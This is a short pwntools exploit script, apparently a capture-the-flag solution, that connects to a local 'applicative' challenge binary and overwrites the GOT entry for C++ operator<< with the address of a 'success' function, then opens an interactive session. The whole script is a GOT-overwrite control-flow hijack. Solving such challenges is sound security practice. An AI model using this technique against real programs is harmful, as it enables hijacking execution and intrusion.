from pwn import *

#p = process("./applicative")
p = remote("localhost", 8000)
e = ELF("./applicative")

cout = e.got["_ZNSolsEm"] #operator<< technically
#win = e.symbols["_Z7successv"]
win = 0x4025F0

print("operator<<: {0:018x}".format(cout))
print("win: {0:018x}".format(win))

p.sendline("245")
p.sendline(str(cout))
p.sendline(str(win))
p.sendline("a")
p.interactive()
